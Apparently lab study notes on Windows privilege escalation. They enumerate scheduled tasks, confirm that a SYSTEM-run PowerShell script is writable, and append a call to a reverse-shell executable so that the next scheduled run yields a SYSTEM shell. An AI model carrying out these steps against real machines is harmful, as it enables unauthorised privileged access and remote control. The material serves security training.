Unfortunately, there is no easy method for enumerating custom tasks that belong to other users as a low privileged user account.

List all scheduled tasks your user can see:

```command prompt - windows
schtasks /query /fo LIST /v
```

In PowerShell:

PS>
```command prompt - windows
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State
```

Often we have to rely on other clues, such as finding a script or log file that indicates a scheduled task is being run.

1. In the C:\DevTools directory, there is a PowerShell script called “CleanUp.ps1”. View the script:

```command prompt - windows
type C:\DevTools\CleanUp.ps1
```

2. This script seems like it is running every minute as the SYSTEM user. We can check our privileges on this script using accesschk.exe:

```command prompt - windows
C:\PrivEsc\accesschk.exe /accepteula -quvw user C:\DevTools\CleanUp.ps1
```

It appears we have the ability to write to this file.

3. Backup the script:

```command prompt - windows
copy C:\DevTools\CleanUp.ps1 C:\Temp\
```

4. Start a listener on Kali.

[[rlwrap]]

5. Use echo to append a call to our reverse shell executable to the end of the script:

[[1._Reverse Shells (WIN)#MSFVenom]]

```command prompt - windows
echo C:\PrivEsc\reverse.exe >> C:\DevTools\CleanUp.ps1
```

6. Wait for the scheduled task to run (it should run every minute) to complete the exploit.